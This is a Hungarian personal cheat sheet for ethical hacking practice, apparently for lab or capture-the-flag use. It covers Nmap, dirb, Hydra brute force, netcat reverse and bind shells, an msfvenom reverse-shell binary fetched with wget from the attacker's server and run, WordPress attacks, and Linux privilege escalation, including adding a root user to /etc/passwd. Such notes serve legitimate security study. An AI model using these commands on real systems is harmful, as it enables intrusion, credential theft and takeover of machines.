# Etikus hackelés jegyzet, enyém amugy de feljavított by ChatGPT

## Nmap - Portszkennelés

- A legtöbb gyakorlatban minden érdekes port benne van az Nmap alapértelmezett 1000 leggyakoribb port listájában, ezért nem szükséges megadni a `-p` kapcsolót.
- Alapértelmezett szkennelés:

```bash
ping <célszerver IP>
nmap -sS -sV <célszerver IP>
```

- `-sS`: TCP SYN szkennelés  
- `-sV`: Szolgáltatásverzió felismerés

---

## HTTP Protokoll és Webes Feltérképezés

- Weboldal elérése böngészőből: `http://<ip>`

### Almappák keresése

- **Dirb (CLI)**

```bash
dirb http://<ip> -r -U <felhasználónév>:<jelszó>
```

- **DirBuster (GUI)**

### Szólisták

- Felhasználónevekhez:  
  `/usr/share/wordlists/dirb/common.txt`

- Jelszavakhoz (Hydra):  
  `rockyou.txt`

---

## Hydra – Brute Force Jelszótörés

```bash
hydra -l <username> -P <jelszólista> <ip> http-get
```

---

## Reverse / Bind Shell Technika

### Reverse Shell

1. Válassz egy portot: `1024 < x < 65000` (pl. 4444)
2. Saját IP lekérése: `ip a`
3. Shellkód generálása: IP és port beégetése
4. Shellkód eljuttatása a célgépre
5. Listener indítása saját gépen:

```bash
nc -lvnp 4444
```

6. Shellkód futtatása a célgépen → kapcsolat létrejön

### Bind Shell

1. Port kiválasztása ✔  
2. Cél IP ismerete  
3. Shellkód generálás ✔  
4. Kód eljuttatása ✔  
5. Ugrás a következő pontra  
6. Kapcsolódás a cél gépen lévő listenerhez:

```bash
nc <cél IP> <port>
```

---

## Netcat Opciók

- `-l`: listen mód  
- `-v`: verbose  
- `-n`: numeric IP, nincs DNS feloldás  
- `-p`: port megadása

---

## Stabilabb Shell

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

---

## CMD Shell Támadás

- Olyan fájl vagy input mező sebezhető, ahol a célgép kódfuttatást enged.

### Példa: ELF fájl futtatása

1. Támadó oldalon generáljuk a shellt:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<támadó IP> LPORT=4444 -f elf > shell.elf
```

2. Listener indítása:

```bash
nc -lvp 4444
```

3. HTTP szerver indítása:

```bash
python3 -m http.server
```

4. Célgépen shell futtatása:

```bash
cd /tmp
rm -f shell.elf
wget http://<támadó IP>:8000/shell.elf
chmod +x shell.elf
./shell.elf
```

---

## WordPress

- WPScan:

```bash
wpscan --url http://<url> -e at,ap,u --usernames <user> --passwords <passwordlist>
```

- Exploit keresés:

```bash
msfconsole
search wordpress
use <exploit_id>
set options
run
```

---

## Exploit Adatbázis

- https://exploit-db.com

---

## Linux Privilege Escalation

### 1. SUID Bitek keresése

```bash
find / -perm -u=s 2>/dev/null
```

- GTFObins segítségével nézd meg, mire használható a bináris.  
  https://gtfobins.github.io

### 2. SSH Privát Kulcsok

- Ellenőrizd:  
  `/home/<user>/.ssh/`

Sima felhasználónév jelszó:
```ssh -p port usernev@ip```

Privát RSA kulccsal belépés ha megvan:
```ssh -p port -i <privkulcs elérhetőség>```

### 3. Sudo jogosultságok megnézése a current userre

```bash
sudo -l
```

### 4. /etc/passwd és /etc/shadow jogai

```cat```-eljük ki őket, nézzük meg.

- Fájl jogosultságok ellenőrzése:

```bash
getfacl <fájlnév>
```

- Hash törés:  
  `john` vagy `hashcat`

### 5. Python Library Hijacking

- Ha a célgépen a script saját mappából importál, akkor saját `random.py` fájl létrehozásával tetszőleges kódot futtathatunk.

---

## Felhasználóváltás

```bash
su <user>
sudo -u <user> <parancs>
```

---

## /etc/passwd manipulálása

Ha van írási jogunk:

```bash
openssl passwd -5 korte
# kimenet: $5$...
```

Majd:

```bash
echo 'hacker:$5$...:0:0:root:/root:/bin/bash' >> /etc/passwd
```

---

## LinPEAS

- Automatikus sebezhetőségvizsgáló eszköz:  
  https://github.com/carlospolop/PEASS-ng

---

## /etc/hosts manipulálása

Először
```bash
sudo nano /etc/hosts
```
majd <ip> <local domain> beillesztése, és mentés.

---
## BurpSuit

```burpsuite``` parancs a futtatásra

---
